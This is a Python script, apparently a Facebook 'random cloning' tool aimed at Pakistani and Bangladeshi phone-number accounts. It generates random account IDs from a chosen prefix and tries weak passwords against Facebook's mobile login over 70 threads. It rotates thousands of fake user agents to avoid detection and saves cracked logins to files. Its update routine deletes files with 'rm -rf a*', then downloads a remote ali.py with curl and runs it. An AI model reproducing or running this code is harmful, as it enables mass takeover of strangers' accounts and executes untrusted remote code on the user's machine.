#coding=utf
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)


ugen=[]
aqib_dalvik_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; P13_Blue_Plus_2022 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; B17 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 12; SOG02 Build/58.2.C.3.127)","Dalvik/2.1.0 (Linux; U; Android 11; SmartVision3 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J200M Build/LMY47X)","Dalvik/2.1.0 (Linux; U; Android 12.0; TX10MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; TECNO CH9 Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; GM1917 Build/SKQ1.211019.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g82 5G Build/S1SUS32.73-112-2-7)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; VUVAMINI Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; HOTREALS Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; DECSMART Build/RTT0.211009.001)","Dalvik/2.1.0 (Linux; U; Android 12; T28-EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (XT2115DL) Build/RPCS31.Q2-109-16-16)","Dalvik/2.1.0 (Linux; U; Android 8.1; HOT10 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K12 Pro Build/RZCS31.Q2-57-12-14)","Dalvik/2.1.0 (Linux; U; Android 11; KIVI 4K Android TV Build/RTM5.220609.207)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo K13 Build/QOJS30.506-7-18)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-17-2)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Z986U Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 7.0; 3277 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2022) Build/S2ST32.71-118-4)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005DA Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-9-4)","Dalvik/2.1.0 (Linux; U; Android 12; LM-F100N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11C Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; M2101K7BG Build/SP1A.210812.016) VD/229","Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012) VD/233","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N)","Dalvik/2.1.0 (Linux; U; Android 13; V2205 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230405.003.E1) ;Pixel 6a","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.600VZ.0576.a)","Dalvik/2.1.0 (Linux; U; Android 12; SH-M17 Build/S6062)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 11; Star 5 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto g power (2022) Build/S3RQS32.20-42-10-7)","Dalvik/2.1.0 (Linux; U; Android 9; Aquaris X Pro Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 11; XM-SW1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-V600 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K7AI Build/TQ1A.230105.002)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G20 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 22041219PI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212A Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6826B Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 ultra Build/S3SQS32.16-72-31-3)","Dalvik/2.1.0 (Linux; U; Android 11; M2003J15SC Build/RP1A.200720.011) VD/233","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415FN Build/M1AJQ) PB/102","Dalvik/2.1.0 (Linux; U; Android 13; DN2101 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; PHB110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Helium Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; MS5539G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; VRD-W10 Build/HUAWEIVRD-W10)","Dalvik/2.1.0 (Linux; U; Android 9; HP Chromebook x360 11 G1 EE Build/R114-15437.8.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; motorola razr 2022 Build/S3SLS32.16-72-14-6)","Dalvik/2.1.0 (Linux; U; Android 11; Schok Volt SV55 Build/SV55216_01.02.04)","Dalvik/2.1.0 (Linux; U; Android 11; Multilaser_GMAX_2 Build/V8_20230215)","Dalvik/2.1.0 (Linux; U; Android 13; S9-KC Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g41 Build/S3RWS32.138-29-5-1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-26)","Dalvik/2.1.0 (Linux; U; Android 7.0; 4047G Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A716S Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; SHV45-u Build/SA110)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A336N Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G950F Build/PPR1.180610.011) PB/102","Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A520F Build/R16NW) PB/102","Dalvik/1.6.0 (Linux; U; Android 4.4.2; XT907 Build/KPA20.10.1)","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 4 Build/QQ2A.200501.001.B2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; HELIOS Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; BRQ-AN00 Build/HUAWEIBRQ-AN00)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Pro Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 pro Build/T1SHS33.35-23-20-2)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SO-53C Build/63.1.B.1.78)","Dalvik/2.1.0 (Linux; U; Android 9; U-BOX A9 Build/UMAX_AI_M)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900 Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; SH-A01 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; skipper Build/OTT1.201231.001/6.0.5.0421)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0021.0)","Dalvik/2.1.0 (Linux; U; Android 10; mainline Build/QD4A.200805.003)","Dalvik/2.1.0 (Linux; U; Android 10; M10_4G_PRO Build/V17_20230110)","Dalvik/2.1.0 (Linux; U; Android 11; P60_EEA Build/MX2_EEA)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-22)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.418)","Dalvik/2.1.0 (Linux; U; Android 9; H8416 Build/52.0.A.8.157)","Dalvik/2.1.0 (Linux; U; Android 11; X96_X4_Pro Build/RD2A.211001.002)",])

for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

logo=("""
     d8b   db  .d88b.   .d88b.  d8888b. 
     888o  88 .8P  Y8. .8P  Y8. 88  `8D 
     \x1b[1;91m88V8o 88 88    88 88    88 88oooY' 
     \x1b[1;91m88 V8o88 88    88 88    88 88~~~b. 
   \x1b[1;97m  88  V888 `8b  d8' `8b  d8' 88   8D 
     VP   V8P  `Y88P'   `Y88P'  Y8888P'
\33[1;37m----------------------------------------------
→   Owner      :  MR.NOOB
→   Facebook   :  RIAZ KHAN
→   Github     :  RIAZ-143
→   Tool Type  :  \x1b[1;95mOPEN SURCE
\x1b[1;97m→   Version    :  XXX
\33[1;37m----------------------------------------------""")

def lines():
	print('\33[1;37m----------------------------------------------')
 
loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update don ')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def riaz():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning menu')
	print('[2] Bangladish Random Cloning')
	print('[3] Create File dumping')
	print('[4] Follow me on Facebook')
	print('\x1b[1;91m[5] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	riaz1 = input('[•] Select option  : ')
	if riaz1 =='1':
		annu()
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://github.com/RIAZ-143/dump')
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081567410458&mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		riaz()


def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    riaz1 = input('[+] CHOOSE optION : ')
    if riaz1 =='1':
    	m1()
    if riaz1 =='2':
    	m2()
    if riaz1 =='3':
    	m3()
    if riaz1 =='4':
    	riaz()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
#
def bangla():
	os.system('clear')
	print(logo)
	print('[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;91m[3] Go to main menu')
	lines()
	riaz1 = input('[+] Select option : ')
	if riaz1 =='1':
		b1()
	if riaz1 =='2':
		b2()
	if riaz1 =='3':
		riaz()
#def choice()
#

def m1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','khan12']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan786','khan1122','khan12','janjan']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#

#
def b1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def b2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','free fire']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#

#


#
#

	
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb  = { 'authority': 'mbasic.facebook.com',
 'method': 'POST',
   'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'aqib_dalvik_ua',} 
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[NOOB-OK] '+cid+'|'+ps+'\033[0;97m')
                open('NOOB-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[NOOB-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('NOOB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.NOOB\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass


riaz()